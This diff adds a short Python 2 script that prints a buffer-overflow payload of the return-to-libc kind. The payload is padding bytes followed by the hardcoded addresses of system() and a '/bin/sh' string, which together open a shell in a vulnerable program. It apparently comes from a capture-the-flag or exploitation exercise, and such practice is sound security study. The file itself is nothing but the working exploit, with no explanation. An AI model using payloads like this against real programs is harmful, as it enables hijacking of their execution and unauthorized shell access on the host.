@@ -1,0 +1,14 @@
+import struct
+
+padding = "A"*140
+
+pad = "A" * 12
+
+zeros = "\x00"*4
+
+system = struct.pack ("I", 0xf7e6aed0)
+
+bin_sh = struct.pack ("I", 0xf7f897ec)
+
+
+print padding + zeros + pad + system + "AAAA" + bin_sh
